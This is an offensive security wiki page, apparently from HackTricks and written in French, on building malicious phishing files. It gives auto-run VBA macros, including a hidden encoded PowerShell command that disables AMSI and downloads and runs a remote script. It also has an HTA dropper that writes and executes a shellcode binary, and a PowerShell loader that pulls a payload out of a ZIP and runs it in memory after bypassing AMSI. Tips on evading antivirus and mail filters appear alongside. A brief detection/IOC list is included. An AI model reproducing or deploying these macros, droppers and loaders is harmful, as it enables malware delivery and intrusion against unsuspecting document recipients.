# Phishing Fichiers & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word effectue une validation des données du fichier avant d'ouvrir un fichier. La validation des données est réalisée sous la forme d'une identification de la structure des données, selon la norme OfficeOpenXML. Si une erreur survient lors de l'identification de la structure des données, le fichier analysé ne sera pas ouvert.

D'ordinaire, les fichiers Word contenant des macros utilisent l'extension `.docm`. Cependant, il est possible de renommer le fichier en changeant l'extension et de conserver malgré tout la capacité d'exécution des macros.\
Par exemple, un fichier RTF ne prend pas en charge les macros, par conception, mais un fichier DOCM renommé en RTF sera traité par Microsoft Word et sera capable d'exécuter des macros.\
Les mêmes mécanismes internes s'appliquent à tous les logiciels de la Microsoft Office Suite (Excel, PowerPoint etc.).

Vous pouvez utiliser la commande suivante pour vérifier quelles extensions vont être exécutées par certains programmes Office :
```bash
assoc | findstr /i "word excel powerp"
```
Les fichiers DOCX faisant référence à un template distant (File –Options –Add-ins –Manage: Templates –Go) qui inclut des macros peuvent également “exécuter” des macros.

### Chargement d'images externes

Aller à : _Insert --> Quick Parts --> Field_\  
_**Categories**: Links and References, **Filed names**: includePicture, et **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Il est possible d'utiliser des macros pour exécuter du code arbitraire depuis le document.

#### Fonctions d'autochargement

Plus elles sont courantes, plus il est probable que l'AV les détecte.

- AutoOpen()
- Document_Open()

#### Exemples de code de macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Supprimer manuellement les métadonnées

Allez dans **File > Info > Inspect Document > Inspect Document**, ce qui ouvrira le Document Inspector. Cliquez sur **Inspect** puis sur **Remove All** à côté de **Document Properties and Personal Information**.

#### Extension du document

Lorsque terminé, sélectionnez le menu déroulant **Save as type**, changez le format de **`.docx`** à **Word 97-2003 `.doc`**.\
Faites cela parce que vous **can't save macro's inside a `.docx`** et qu'il existe une **stigmatisation** **autour** de l'extension macro-enabled **`.docm`** (par ex. l'icône miniature affiche un énorme `!` et certaines passerelles web/email les bloquent complètement). Par conséquent, cette **ancienne extension `.doc` est le meilleur compromis**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Fichiers HTA

Un HTA est un programme Windows qui **combine HTML et des langages de script (tels que VBScript et JScript)**. Il génère l'interface utilisateur et s'exécute comme une application "fully trusted", sans les contraintes du modèle de sécurité d'un navigateur.

Un HTA est exécuté à l'aide de **`mshta.exe`**, qui est typiquement **installé** avec **Internet Explorer**, rendant **`mshta` dépendant d'IE**. Donc si celui-ci a été désinstallé, les HTA ne pourront pas s'exécuter.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcer l'authentification NTLM

Il existe plusieurs façons de **forcer l'authentification NTLM "à distance"**, par exemple, vous pouvez ajouter des **images invisibles** aux emails ou au HTML que l'utilisateur ouvrira (même HTTP MitM?). Ou envoyer à la victime l'**adresse de fichiers** qui **déclenchera** une **authentification** rien qu'en **ouvrant le dossier.**

**Consultez ces idées et plus dans les pages suivantes :**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

N'oubliez pas que vous ne pouvez pas seulement voler le hash ou l'authentification mais aussi **perform NTLM relay attacks** :

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Les campagnes très efficaces livrent un ZIP qui contient deux documents d'appât légitimes (PDF/DOCX) et un .lnk malveillant. L'astuce est que le chargeur PowerShell réel est stocké dans les octets bruts du ZIP après un marqueur unique, et le .lnk l'extrait et l'exécute entièrement en mémoire.

Typical flow implemented by the .lnk PowerShell one-liner:

1) Localiser le ZIP original dans des chemins courants : Desktop, Downloads, Documents, %TEMP%, %ProgramData%, et le répertoire parent du répertoire de travail courant.
2) Lire les octets du ZIP et trouver un marqueur en dur (par ex., xFIQCV). Tout ce qui suit le marqueur est la charge utile PowerShell intégrée.
3) Copier le ZIP vers %ProgramData%, l'extraire là, et ouvrir le .docx d'appât pour paraître légitime.
4) Contourner AMSI pour le processus courant : [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Déobfusquer l'étape suivante (par ex., supprimer tous les caractères #) et l'exécuter en mémoire.

Exemple de squelette PowerShell pour extraire et exécuter l'étape intégrée :
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Remarques
- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
- L'étape suivante décrypte fréquemment du shellcode base64/XOR et l'exécute via Reflection.Emit + VirtualAlloc pour minimiser les artefacts sur disque.

Persistence used in the same chain
- COM TypeLib hijacking du Microsoft Web Browser control afin que IE/Explorer ou toute application l'intégrant relance automatiquement le payload. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Fichiers ZIP contenant la chaîne marqueur ASCII (p.ex., xFIQCV) ajoutée aux données de l'archive.
- .lnk qui énumère les dossiers parent/utilisateur pour localiser le ZIP et ouvre un document leurre.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Threads métier de longue durée se terminant par des liens hébergés sous des domaines PaaS de confiance.

## Fichiers Windows pour voler des hachages NTLM

Consultez la page sur **les endroits pour voler des identifiants NTLM** :

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Références

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
